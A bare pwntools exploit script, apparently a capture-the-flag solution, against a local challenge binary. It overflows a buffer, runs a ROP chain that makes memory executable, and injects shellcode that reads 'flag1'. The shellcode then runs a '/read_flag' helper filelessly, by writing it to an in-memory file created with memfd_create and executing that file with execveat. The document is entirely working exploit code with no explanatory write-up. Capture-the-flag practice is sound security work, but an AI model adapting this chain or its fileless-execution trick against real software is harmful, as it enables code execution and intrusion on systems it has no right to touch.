from pwn import *
context.arch = "amd64"
r = process('./run.sh')

#0x0000000000474a05: syscall; ret;
#0x000000000044b9d9: pop rdx; pop rsi; ret;
#0x0000000000415234: pop rax; ret;
#0x0000000000400686: pop rdi; ret;
#0x000000000043ff98: add al, 7; ret;
payload = "a"*0x108

payload += flat(
0x415234,3,0x43ff98,0x400686,0x006b6000,0x44b9d9,0x7,0x6000,0x474a05,
0x415234,0,0x400686,0,0x44b9d9,0x1000,0x006b6000,0x474a05,0x006b6000
)

r.sendline(payload)
r.send(asm(shellcraft.cat("flag1")+
shellcraft.pushstr("Billy")+
"""
mov rax,319
mov rdi,rsp
mov rsi,0
syscall
mov rbx,rax
mov rbp,rax"""+
shellcraft.pushstr("#!/read_flag\n")+
shellcraft.syscall('SYS_write','rbp','rsp',13)+
"""
push 0
mov rsi,rsp
xor rdx,rdx
xor r10,r10
mov r8,0x1000
mov rax,322
syscall
""" + 
shellcraft.exit(0)
))
r.interactive()
